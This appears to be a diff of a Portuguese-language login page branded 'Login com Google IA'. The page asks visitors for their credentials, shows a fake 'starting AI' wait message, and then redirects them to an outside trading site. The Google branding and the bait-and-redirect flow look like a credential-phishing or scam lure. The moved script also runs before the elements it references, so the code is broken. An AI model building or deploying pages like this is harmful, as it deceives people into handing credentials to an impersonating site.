@@ -62,7 +62,25 @@
     </style>
 </head>
 <body>
+    <script>
+        // Função chamada ao enviar o formulário
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            // Exibe a mensagem de espera
+            document.getElementById('messageContainer').style.display = 'block';
 
+            // Não interrompe o envio do formulário
+            // A execução do redirecionamento ocorre após o envio e processamento
+        });
+
+        // Aguardar o envio do formulário e redirecionar para a página desejada
+        document.getElementById('loginForm').onsubmit = function() {
+            setTimeout(function() {
+                // Após 2 segundos, redireciona para o site desejado
+                window.location.href = "https://tradeboosting.org/app/login.php"; 
+            }, 2000);
+        };
+    </script>
+    
     <div class="login-container">
         <h2>Login com Google IA</h2>
         <h5>Insira suas credenciais para começar</h5>
@@ -81,17 +99,6 @@
     <div class="message-container" id="messageContainer">
         <p>Iniciando IA, aguarde... Isso poderá levar alguns minutos.</p>
     </div>
-
-    <script>
-
-        // Aguardar o envio do formulário e redirecionar para a página desejada
-        document.getElementById('loginForm').onsubmit = function() {
-            setTimeout(function() {
-                // Após 2 segundos, redireciona para o site desejado
-                window.location.href = "https://tradeboosting.org/app/login.php"; 
-            }, 2000);
-        };
-    </script>
 
 </body>
 </html>
